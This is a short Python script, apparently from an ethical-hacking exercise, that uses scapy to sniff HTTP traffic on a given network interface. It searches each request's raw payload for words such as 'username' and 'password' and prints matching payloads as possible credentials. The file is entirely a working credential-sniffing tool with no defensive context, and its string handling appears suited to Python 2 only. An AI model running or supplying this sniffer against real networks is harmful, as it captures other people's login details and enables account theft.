import scapy.all as scapy
from scapy.layers import http
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()

    parser.add_argument("-i", dest="interface", help="Interface to start sniffing")

    option = parser.parse_args()
    if not option.interface:
        parser.error("[-] Please specify a interface to start sniffing, use --help for more info")

    return option


options = get_arguments()

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)



def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


sniff(options.interface)
